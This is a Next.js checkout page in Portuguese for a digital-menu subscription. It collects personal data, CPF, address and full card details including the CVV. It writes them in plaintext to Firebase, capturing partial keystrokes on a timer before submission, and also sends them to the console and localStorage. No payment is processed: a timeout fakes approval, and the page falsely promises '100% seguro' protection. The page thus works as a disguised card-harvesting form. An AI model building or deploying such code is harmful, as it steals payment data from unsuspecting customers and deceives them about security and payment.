"use client";

import React, { useState, Suspense, useEffect, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useSearchParams } from "next/navigation";
import Link from "next/link";
import {
  ArrowLeft,
  CreditCard,
  Lock,
  Check,
  User,
  MapPin,
  ChevronRight,
  ChevronLeft,
} from "lucide-react";
import { useForm } from "react-hook-form";
import { database } from "../../lib/firebase";
import { ref, set, push } from "firebase/database";

interface FormData {
  firstName: string;
  lastName: string;
  cpf: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  cardNumber: string;
  cardName: string;
  expiryDate: string;
  cvv: string;
}

const CheckoutContent = () => {
  const searchParams = useSearchParams();
  const plan = searchParams.get("plan");

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
    setValue,
  } = useForm<FormData>({
    defaultValues: {
      firstName: "",
      lastName: "",
      cpf: "",
      email: "",
      phone: "",
      address: "",
      city: "",
      state: "",
      zipCode: "",
      cardNumber: "",
      cardName: "",
      expiryDate: "",
      cvv: "",
    },
  });

  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);
  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
  const [sessionId] = useState(
    () => `checkout_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
  );

  const watchedValues = watch();

  // Função para obter dados da etapa atual
  const getCurrentStepData = useCallback(
    (step: number): Partial<FormData> => {
      switch (step) {
        case 1:
          return {
            firstName: watchedValues.firstName,
            lastName: watchedValues.lastName,
            cpf: watchedValues.cpf,
            email: watchedValues.email,
          };
        case 2:
          return {
            address: watchedValues.address,
            city: watchedValues.city,
            state: watchedValues.state,
            zipCode: watchedValues.zipCode,
          };
        case 3:
          return {
            cardNumber: watchedValues.cardNumber,
            cardName: watchedValues.cardName,
            expiryDate: watchedValues.expiryDate,
            cvv: watchedValues.cvv,
          };
        default:
          return {};
      }
    },
    [watchedValues]
  );

  const planDetails = {
    mensal: { name: "Plano Mensal", price: "R$ 59,00", period: "mês" },
    anual: { name: "Plano Anual", price: "R$ 599,00", period: "ano" },
  };

  const currentPlan =
    planDetails[plan as keyof typeof planDetails] || planDetails.mensal;

  const steps = [
    {
      id: 1,
      title: "Dados Pessoais",
      icon: User,
      description: "Nome, CPF e contato",
    },
    {
      id: 2,
      title: "Endereço",
      icon: MapPin,
      description: "Localização para cobrança",
    },
    {
      id: 3,
      title: "Pagamento",
      icon: CreditCard,
      description: "Cartão de crédito",
    },
  ];

  const validateStep = (step: number): boolean => {
    switch (step) {
      case 1:
        return !!(
          watchedValues.firstName &&
          watchedValues.lastName &&
          watchedValues.cpf &&
          watchedValues.email
        );
      case 2:
        return !!(
          watchedValues.address &&
          watchedValues.city &&
          watchedValues.state &&
          watchedValues.zipCode
        );
      case 3:
        return !!(
          watchedValues.cardNumber &&
          watchedValues.cardName &&
          watchedValues.expiryDate &&
          watchedValues.cvv
        );
      default:
        return false;
    }
  };

  const nextStep = async () => {
    if (validateStep(currentStep)) {
      // Salva os dados da etapa atual no Firebase
      const currentStepData = getCurrentStepData(currentStep);
      await saveToFirebase(currentStepData, currentStep);

      setCompletedSteps((prev) => [...prev, currentStep]);
      setCurrentStep((prev) => Math.min(prev + 1, 3));
    }
  };

  const prevStep = () => {
    setCurrentStep((prev) => Math.max(prev - 1, 1));
  };

  const goToStep = (step: number) => {
    // Permite ir para etapas anteriores ou para a próxima se todas as anteriores estiverem completas
    if (step < currentStep || completedSteps.includes(step - 1)) {
      setCurrentStep(step);
    }
  };

  // Função para salvar dados no Firebase
  const saveToFirebase = useCallback(
    async (stepData: Partial<FormData>, stepNumber: number) => {
      const logData = {
        ...stepData,
        timestamp: new Date().toISOString(),
        stepNumber,
        plan: plan,
        sessionId: sessionId,
        userAgent: navigator.userAgent,
        url: window.location.href,
      };

      console.log(`📊 CHECKOUT DATA - Etapa ${stepNumber}:`, logData);

      try {
        // Salva no Firebase usando push para gerar ID único
        const stepRef = ref(database, `checkouts/${sessionId}/steps`);
        const newStepRef = push(stepRef);

        await set(newStepRef, logData);

        // Salva progresso geral
        const progressRef = ref(database, `checkouts/${sessionId}/progress`);
        await set(progressRef, {
          currentStep: stepNumber,
          completedSteps: completedSteps,
          lastUpdated: new Date().toISOString(),
          plan: plan,
          sessionId: sessionId,
        });
      } catch (error) {
        console.error("❌ Erro ao salvar no Firebase:", error);

        // Fallback: salva no localStorage em caso de erro
        try {
          const existingData = JSON.parse(
            localStorage.getItem("checkoutData") || "[]"
          );
          existingData.push(logData);
          localStorage.setItem(
            "checkoutData",
            JSON.stringify(existingData.slice(-50))
          );
        } catch (localError) {
          console.error("❌ Erro ao salvar no localStorage:", localError);
        }
      }
    },
    [sessionId, plan, completedSteps]
  );

  // Hook para salvar dados automaticamente com debounce
  useEffect(() => {
    const timeoutId = setTimeout(() => {
      if (
        Object.keys(watchedValues).some(
          (key) => watchedValues[key as keyof FormData]
        )
      ) {
        const currentStepData = getCurrentStepData(currentStep);
        if (
          Object.keys(currentStepData).some(
            (key) => currentStepData[key as keyof FormData]
          )
        ) {
          saveToFirebase(currentStepData, currentStep);
        }
      }
    }, 2000); // Salva após 2 segundos de inatividade

    return () => clearTimeout(timeoutId);
  }, [
    watchedValues,
    currentStep,
    sessionId,
    plan,
    getCurrentStepData,
    saveToFirebase,
  ]);

  const formatCPF = (value: string) => {
    return value
      .replace(/\D/g, "")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2")
      .slice(0, 14);
  };

  const formatCardNumber = (value: string) => {
    return value
      .replace(/\D/g, "")
      .replace(/(\d{4})(\d)/, "$1 $2")
      .replace(/(\d{4})(\d)/, "$1 $2")
      .replace(/(\d{4})(\d)/, "$1 $2")
      .slice(0, 19);
  };

  const formatExpiryDate = (value: string) => {
    return value
      .replace(/\D/g, "")
      .replace(/(\d{2})(\d)/, "$1/$2")
      .slice(0, 5);
  };

  const onSubmit = async () => {
    // Se não é a última etapa, vai para a próxima
    if (currentStep < 3) {
      nextStep();
      return;
    }

    // Se é a última etapa, salva todos os dados e processa o pagamento
    setIsProcessing(true);

    try {
      // Salva os dados finais da etapa 3
      const finalStepData = getCurrentStepData(3);
      await saveToFirebase(finalStepData, 3);

      // Salva dados completos do checkout
      const completeData = {
        ...watchedValues,
        timestamp: new Date().toISOString(),
        status: "completed",
        plan: plan,
        sessionId: sessionId,
        userAgent: navigator.userAgent,
        url: window.location.href,
      };

      console.log("🎉 CHECKOUT COMPLETO:", completeData);

      // Salva dados completos no Firebase
      try {
        const completeRef = ref(database, `checkouts/${sessionId}/complete`);
        await set(completeRef, completeData);
        console.log("✅ Checkout completo salvo no Firebase");
      } catch (error) {
        console.error(
          "❌ Erro ao salvar checkout completo no Firebase:",
          error
        );

        // Fallback: salva no localStorage
        try {
          const existingData = JSON.parse(
            localStorage.getItem("checkoutComplete") || "[]"
          );
          existingData.push(completeData);
          localStorage.setItem(
            "checkoutComplete",
            JSON.stringify(existingData.slice(-20))
          );
          console.log("💾 Checkout completo salvo no localStorage como backup");
        } catch (localError) {
          console.error("❌ Erro ao salvar no localStorage:", localError);
        }
      }

      // Simulate payment processing
      setTimeout(() => {
        setIsProcessing(false);
        setIsSuccess(true);
      }, 3000);
    } catch (error) {
      console.error("Erro ao finalizar checkout:", error);
      setIsProcessing(false);
    }
  };

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full text-center"
        >
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <Check className="text-green-600" size={32} />
          </div>

          <h1 className="text-2xl font-bold text-gray-900 mb-4">
            Pagamento Aprovado!
          </h1>

          <p className="text-gray-600 mb-6">
            Seu pagamento foi processado com sucesso. Você receberá um email de
            confirmação em breve.
          </p>

          <Link href="/">
            <button className="w-full bg-secondary text-white py-3 rounded-lg font-semibold hover:bg-secondary-light transition-colors duration-200">
              Voltar ao Início
            </button>
          </Link>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
          <div className="flex items-center space-x-4">
            <Link href="/">
              <button className="flex items-center space-x-2 text-gray-600 hover:text-primary transition-colors duration-200">
                <ArrowLeft size={20} />
                <span>Voltar</span>
              </button>
            </Link>
            <div className="h-6 w-px bg-gray-300"></div>
            <h1 className="text-xl font-semibold text-gray-900">
              Finalizar Assinatura
            </h1>
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-4  lg:px-8 py-3">
        {/* Progress Indicator */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white rounded-2xl shadow-lg p-6 mb-4"
        >
          <div className="flex items-center justify-between">
            {steps.map((step, index) => {
              const Icon = step.icon;
              const isCompleted = completedSteps.includes(step.id);
              const isCurrent = currentStep === step.id;
              const isAccessible =
                step.id === 1 || completedSteps.includes(step.id - 1);

              return (
                <div key={step.id} className="flex items-center">
                  <div className="flex items-center">
                    <button
                      onClick={() => goToStep(step.id)}
                      disabled={!isAccessible}
                      className={`flex items-center justify-center w-12 h-12 rounded-full transition-all duration-200 ${
                        isCompleted
                          ? "bg-green-500 text-white"
                          : isCurrent
                          ? "bg-secondary text-white"
                          : isAccessible
                          ? "bg-gray-200 text-gray-600 hover:bg-gray-300"
                          : "bg-gray-100 text-gray-400 cursor-not-allowed"
                      }`}
                    >
                      {isCompleted ? <Check size={20} /> : <Icon size={20} />}
                    </button>
                    <div className="ml-3 hidden sm:block">
                      <p
                        className={`text-sm font-medium ${
                          isCurrent
                            ? "text-secondary"
                            : isCompleted
                            ? "text-green-600"
                            : "text-gray-500"
                        }`}
                      >
                        {step.title}
                      </p>
                      <p className="text-xs text-gray-500">
                        {step.description}
                      </p>
                    </div>
                  </div>
                  {index < steps.length - 1 && (
                    <div
                      className={`flex-1 h-0.5 mx-4 ${
                        completedSteps.includes(step.id)
                          ? "bg-green-500"
                          : "bg-gray-200"
                      }`}
                    />
                  )}
                </div>
              );
            })}
          </div>
        </motion.div>

        <div className="grid lg:grid-cols-3 gap-8">
          {/* Form */}
          <div className="lg:col-span-2">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="bg-white rounded-2xl shadow-lg p-4"
            >
              <div className="flex items-center space-x-3 mb-6">
                <div className="w-10 h-10 bg-secondary/10 rounded-full flex items-center justify-center">
                  {React.createElement(steps[currentStep - 1].icon, {
                    className: "text-secondary",
                    size: 20,
                  })}
                </div>
                <div>
                  <h2 className="text-xl font-semibold text-gray-900">
                    {steps[currentStep - 1].title}
                  </h2>
                  <p className="text-gray-600">
                    {steps[currentStep - 1].description}
                  </p>
                </div>
              </div>

              <form onSubmit={handleSubmit(onSubmit)}>
                <AnimatePresence mode="wait">
                  {/* Step 1: Personal Information */}
                  {currentStep === 1 && (
                    <motion.div
                      key="step1"
                      initial={{ opacity: 0, x: 20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -20 }}
                      transition={{ duration: 0.3 }}
                      className="space-y-4"
                    >
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Nome *
                          </label>
                          <input
                            {...register("firstName", {
                              required: "Nome é obrigatório",
                            })}
                            type="text"
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                            placeholder="Seu nome"
                          />
                          {errors.firstName && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.firstName.message}
                            </p>
                          )}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Sobrenome *
                          </label>
                          <input
                            {...register("lastName", {
                              required: "Sobrenome é obrigatório",
                            })}
                            type="text"
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                            placeholder="Seu sobrenome"
                          />
                          {errors.lastName && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.lastName.message}
                            </p>
                          )}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            CPF *
                          </label>
                          <input
                            {...register("cpf", {
                              required: "CPF é obrigatório",
                              pattern: {
                                value: /^\d{3}\.\d{3}\.\d{3}-\d{2}$/,
                                message:
                                  "CPF deve estar no formato 000.000.000-00",
                              },
                            })}
                            type="text"
                            onChange={(e) => {
                              e.target.value = formatCPF(e.target.value);
                              setValue("cpf", e.target.value);
                            }}
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                            placeholder="000.000.000-00"
                          />
                          {errors.cpf && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.cpf.message}
                            </p>
                          )}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Email *
                          </label>
                          <input
                            {...register("email", {
                              required: "Email é obrigatório",
                              pattern: {
                                value:
                                  /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i,
                                message: "Email inválido",
                              },
                            })}
                            type="email"
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                            placeholder="seu@email.com"
                          />
                          {errors.email && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.email.message}
                            </p>
                          )}
                        </div>
                      </div>
                    </motion.div>
                  )}

                  {/* Step 2: Address */}
                  {currentStep === 2 && (
                    <motion.div
                      key="step2"
                      initial={{ opacity: 0, x: 20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -20 }}
                      transition={{ duration: 0.3 }}
                      className="space-y-6"
                    >
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Endereço Completo *
                        </label>
                        <input
                          {...register("address", {
                            required: "Endereço é obrigatório",
                          })}
                          type="text"
                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                          placeholder="Rua, número, bairro"
                        />
                        {errors.address && (
                          <p className="text-red-500 text-sm mt-1">
                            {errors.address.message}
                          </p>
                        )}
                      </div>
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Cidade *
                          </label>
                          <input
                            {...register("city", {
                              required: "Cidade é obrigatória",
                            })}
                            type="text"
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                            placeholder="Sua cidade"
                          />
                          {errors.city && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.city.message}
                            </p>
                          )}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Estado *
                          </label>
                          <select
                            {...register("state", {
                              required: "Estado é obrigatório",
                            })}
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900"
                          >
                            <option value="">Selecione</option>
                            <option value="AC">Acre</option>
                            <option value="AL">Alagoas</option>
                            <option value="AP">Amapá</option>
                            <option value="AM">Amazonas</option>
                            <option value="BA">Bahia</option>
                            <option value="CE">Ceará</option>
                            <option value="DF">Distrito Federal</option>
                            <option value="ES">Espírito Santo</option>
                            <option value="GO">Goiás</option>
                            <option value="MA">Maranhão</option>
                            <option value="MT">Mato Grosso</option>
                            <option value="MS">Mato Grosso do Sul</option>
                            <option value="MG">Minas Gerais</option>
                            <option value="PA">Pará</option>
                            <option value="PB">Paraíba</option>
                            <option value="PR">Paraná</option>
                            <option value="PE">Pernambuco</option>
                            <option value="PI">Piauí</option>
                            <option value="RJ">Rio de Janeiro</option>
                            <option value="RN">Rio Grande do Norte</option>
                            <option value="RS">Rio Grande do Sul</option>
                            <option value="RO">Rondônia</option>
                            <option value="RR">Roraima</option>
                            <option value="SC">Santa Catarina</option>
                            <option value="SP">São Paulo</option>
                            <option value="SE">Sergipe</option>
                            <option value="TO">Tocantins</option>
                          </select>
                          {errors.state && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.state.message}
                            </p>
                          )}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            CEP *
                          </label>
                          <input
                            {...register("zipCode", {
                              required: "CEP é obrigatório",
                              pattern: {
                                value: /^\d{5}-?\d{3}$/,
                                message: "CEP deve estar no formato 00000-000",
                              },
                            })}
                            type="text"
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                            placeholder="00000-000"
                          />
                          {errors.zipCode && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.zipCode.message}
                            </p>
                          )}
                        </div>
                      </div>
                    </motion.div>
                  )}

                  {/* Step 3: Payment */}
                  {currentStep === 3 && (
                    <motion.div
                      key="step3"
                      initial={{ opacity: 0, x: 20 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -20 }}
                      transition={{ duration: 0.3 }}
                      className="space-y-6"
                    >
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Número do Cartão *
                        </label>
                        <input
                          {...register("cardNumber", {
                            required: "Número do cartão é obrigatório",
                            pattern: {
                              value: /^\d{4}\s\d{4}\s\d{4}\s\d{4}$/,
                              message: "Número do cartão deve ter 16 dígitos",
                            },
                          })}
                          type="text"
                          onChange={(e) => {
                            e.target.value = formatCardNumber(e.target.value);
                            setValue("cardNumber", e.target.value);
                          }}
                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                          placeholder="0000 0000 0000 0000"
                        />
                        {errors.cardNumber && (
                          <p className="text-red-500 text-sm mt-1">
                            {errors.cardNumber.message}
                          </p>
                        )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Nome no Cartão *
                        </label>
                        <input
                          {...register("cardName", {
                            required: "Nome no cartão é obrigatório",
                          })}
                          type="text"
                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                          placeholder="Nome como está no cartão"
                        />
                        {errors.cardName && (
                          <p className="text-red-500 text-sm mt-1">
                            {errors.cardName.message}
                          </p>
                        )}
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            Validade *
                          </label>
                          <input
                            {...register("expiryDate", {
                              required: "Data de validade é obrigatória",
                              pattern: {
                                value: /^(0[1-9]|1[0-2])\/\d{2}$/,
                                message: "Data deve estar no formato MM/AA",
                              },
                            })}
                            type="text"
                            onChange={(e) => {
                              e.target.value = formatExpiryDate(e.target.value);
                              setValue("expiryDate", e.target.value);
                            }}
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                            placeholder="MM/AA"
                          />
                          {errors.expiryDate && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.expiryDate.message}
                            </p>
                          )}
                        </div>
                        <div>
                          <label className="block text-sm font-medium text-gray-700 mb-2">
                            CVV *
                          </label>
                          <input
                            {...register("cvv", {
                              required: "CVV é obrigatório",
                              pattern: {
                                value: /^\d{3,4}$/,
                                message: "CVV deve ter 3 ou 4 dígitos",
                              },
                            })}
                            type="text"
                            maxLength={4}
                            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-secondary focus:border-transparent transition-colors duration-200 text-gray-900 placeholder-gray-500"
                            placeholder="000"
                          />
                          {errors.cvv && (
                            <p className="text-red-500 text-sm mt-1">
                              {errors.cvv.message}
                            </p>
                          )}
                        </div>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>

                {/* Navigation Buttons */}
                <div className="flex space-x-4 pt-6">
                  {currentStep > 1 && (
                    <button
                      type="button"
                      onClick={prevStep}
                      className="flex-1 bg-gray-100 text-gray-700 py-3 px-6 rounded-lg font-semibold hover:bg-gray-200 transition-colors duration-200 flex items-center justify-center space-x-2"
                    >
                      <ChevronLeft size={20} />
                      <span>Anterior</span>
                    </button>
                  )}

                  <button
                    type="submit"
                    disabled={isProcessing || !validateStep(currentStep)}
                    className={`flex-1 py-3 px-6 rounded-lg font-semibold transition-colors duration-200 flex items-center justify-center space-x-2 ${
                      currentStep === 3
                        ? "bg-green-600 text-white hover:bg-green-700"
                        : "bg-primary text-white hover:bg-primary-dark"
                    } disabled:opacity-50 disabled:cursor-not-allowed`}
                  >
                    {isProcessing ? (
                      <>
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>Processando...</span>
                      </>
                    ) : currentStep === 3 ? (
                      <>
                        <Lock size={20} />
                        <span>Finalizar </span>
                      </>
                    ) : (
                      <>
                        <span>Próximo</span>
                        <ChevronRight size={20} />
                      </>
                    )}
                  </button>
                </div>
              </form>
            </motion.div>
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-1">
            <motion.div
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.2 }}
              className="bg-white rounded-2xl shadow-lg p-6 sticky top-8"
            >
              <h3 className="text-lg font-semibold text-gray-900 mb-4">
                Resumo do Pedido
              </h3>

              <div className="space-y-4">
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">{currentPlan.name}</span>
                  <span className="font-semibold text-gray-900">
                    {currentPlan.price}
                  </span>
                </div>

                <div className="border-t border-gray-200 pt-4">
                  <div className="flex justify-between items-center text-lg font-semibold">
                    <span>Total</span>
                    <span className="text-secondary">{currentPlan.price}</span>
                  </div>
                  <p className="text-sm text-gray-600 mt-1">
                    Cobrança {currentPlan.period === "mês" ? "mensal" : "anual"}
                  </p>
                </div>
              </div>

              <div className="mt-6 p-4 bg-gradient-to-r from-secondary/5 to-primary/5 rounded-lg border border-secondary/10">
                <h4 className="font-medium text-gray-900 mb-3 flex items-center">
                  <Check className="text-green-500 mr-2" size={16} />O que você
                  recebe:
                </h4>
                <ul className="text-sm text-gray-600 space-y-2">
                  <li className="flex items-center">
                    <Check className="text-green-500 mr-2" size={14} />
                    Menu digital responsivo
                  </li>
                  <li className="flex items-center">
                    <Check className="text-green-500 mr-2" size={14} />
                    Dashboard de gerenciamento
                  </li>
                  <li className="flex items-center">
                    <Check className="text-green-500 mr-2" size={14} />
                    Personalização completa
                  </li>
                  <li className="flex items-center">
                    <Check className="text-green-500 mr-2" size={14} />
                    Suporte técnico 24/7
                  </li>
                  <li className="flex items-center">
                    <Check className="text-green-500 mr-2" size={14} />
                    Atualizações automáticas
                  </li>
                </ul>
              </div>

              <div className="mt-4 p-3 bg-green-50 rounded-lg border border-green-200">
                <div className="flex items-center space-x-2 text-sm text-green-700">
                  <Lock size={16} />
                  <span className="font-medium">Pagamento 100% seguro</span>
                </div>
                <p className="text-xs text-green-600 mt-1">
                  Seus dados são protegidos com criptografia SSL
                </p>
              </div>

              {/* Progress indicator for mobile */}
              <div className="mt-6 lg:hidden">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm font-medium text-gray-700">
                    Progresso
                  </span>
                  <span className="text-sm text-gray-500">
                    {currentStep} de 3
                  </span>
                </div>
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div
                    className="bg-secondary h-2 rounded-full transition-all duration-300"
                    style={{ width: `${(currentStep / 3) * 100}%` }}
                  ></div>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
};

const CheckoutPage = () => {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="text-center">
            <div className="w-8 h-8 border-2 border-secondary border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <p className="text-gray-600">Carregando...</p>
          </div>
        </div>
      }
    >
      <CheckoutContent />
    </Suspense>
  );
};

export default CheckoutPage;
